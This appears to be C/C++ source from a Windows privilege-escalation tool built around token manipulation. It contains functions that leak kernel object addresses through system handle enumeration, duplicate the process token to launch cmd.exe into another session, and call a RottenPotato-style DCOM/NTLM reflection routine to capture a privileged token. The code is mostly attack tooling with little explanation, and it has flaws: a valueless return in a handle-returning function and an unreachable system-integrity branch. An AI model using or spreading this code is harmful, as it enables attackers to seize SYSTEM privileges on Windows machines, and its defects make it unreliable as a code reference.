#include "poptoke.h"

PSID
GetLocalSystemSID()
{
	SID_IDENTIFIER_AUTHORITY sidAuth = SECURITY_NT_AUTHORITY;
	PSID psid = NULL;
	BOOL bRet = AllocateAndInitializeSid(&sidAuth, 1,
		SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &psid);
	if (!bRet)
		return NULL;

	LPWSTR stringsid;
	ConvertSidToStringSid(psid, &stringsid);
	return psid;
}

PVOID
GetInfoFromToken(HANDLE current_token, TOKEN_INFORMATION_CLASS tic)
{
	DWORD n;
	PVOID data;

	if (!GetTokenInformation(current_token, tic, 0, 0, &n) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		return 0;

	data = (PVOID)malloc(n);

	if (GetTokenInformation(current_token, tic, data, n, &n))
		return data;
	else
		free(data);

	return 0;
}

// fetch parent process ID
DWORD
GetParentProcessId()
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD ppid = 0, pid = GetCurrentProcessId();

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	__try{
		if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

		ZeroMemory(&pe32, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (!Process32First(hSnapshot, &pe32)) __leave;

		do {
			if (pe32.th32ProcessID == pid){
				ppid = pe32.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	__finally{
		if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
	}

	return ppid;
}

//
// use NtQuerySystemInformation to retrieve object address from process id
//
LPVOID
GetHandleAddress(ULONG dwProcessId, USHORT hObject)
{
	static BYTE HandleInformation[4096 * 16 * 16];
	DWORD BytesReturned;
	ULONG i;

	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x10, HandleInformation, sizeof(HandleInformation), &BytesReturned);

	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)HandleInformation;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO CurrentHandle = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&HandleInfo->Handles[0];

	for (i = 0; i<HandleInfo->NumberOfHandles; CurrentHandle++, i++)
	{
		if (CurrentHandle->UniqueProcessId == dwProcessId &&
			CurrentHandle->HandleValue == (USHORT)hObject)
		{
			return CurrentHandle->Object;
		}
	}

	return NULL;
}

void
DumpIL(HANDLE token){

	PTOKEN_MANDATORY_LABEL integrity = NULL;
	DWORD dwIntegrityLevel;
	integrity = (PTOKEN_MANDATORY_LABEL)GetInfoFromToken(token, TokenIntegrityLevel);
	dwIntegrityLevel = *GetSidSubAuthority(integrity->Label.Sid,
		(DWORD)(UCHAR)(*GetSidSubAuthorityCount(integrity->Label.Sid) - 1));

	if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
	{
		// Low Integrity
		wprintf(L"Low Process\n");
	}
	else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
		dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
	{
		// Medium Integrity
		wprintf(L"Medium Process\n");
	}
	else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
	{
		// High Integrity
		wprintf(L"High Integrity Process\n");
	}
	else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
	{
		// System Integrity
		wprintf(L"System Integrity Process\n");
	}
}

void
run_service(DWORD session_id)
{
	HANDLE current_token, duped_token;
	LPWSTR data[1024];
	DWORD out;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ALL_ACCESS,
		&current_token))
		return;

	// dup token
	DuplicateTokenEx(current_token, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &duped_token);

	// set session id
	SetTokenInformation(duped_token, TokenSessionId, &session_id, sizeof(DWORD));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	CreateProcessAsUser(duped_token, L"cmd.exe", L"cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);
}

HANDLE
create_restricted_token()
{
	HANDLE restricted_token;
	BOOL result;
	SID_AND_ATTRIBUTES sida;
	PSID pEveryoneSid = NULL;

	ConvertStringSidToSid(L"S-1-5-21-3478215332-3943881913-3083927621-1000", &pEveryoneSid);
	sida.Sid = pEveryoneSid;
	sida.Attributes = 0;

	// create 
	HANDLE xtoken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &xtoken);

	result = CreateRestrictedToken(xtoken,
		LUA_TOKEN,
		0,
		NULL,
		0,
		NULL,
		1,
		&sida,
		&restricted_token
		);

	if (!result){
		printf("CreateRestrictedToken failed: %d\n", GetLastError());
		return;
	}

	if (IsTokenRestricted(restricted_token))
		printf("[+] Token is restricted!\n");
	else
		printf("[-] Token is not restricted!\n");

	//se_assign_primary_priv(restricted_token);
	return restricted_token;
}

HANDLE
get_rp_token()
{
	HANDLE hClientToken = NULL;
	CMSFRottenPotato* test = new CMSFRottenPotato();
	test->startCOMListenerThread();
	test->startRPCConnectionThread();
	test->triggerDCOM();
	
	QuerySecurityContextToken(test->negotiator->phContext, &hClientToken);
	return hClientToken;
}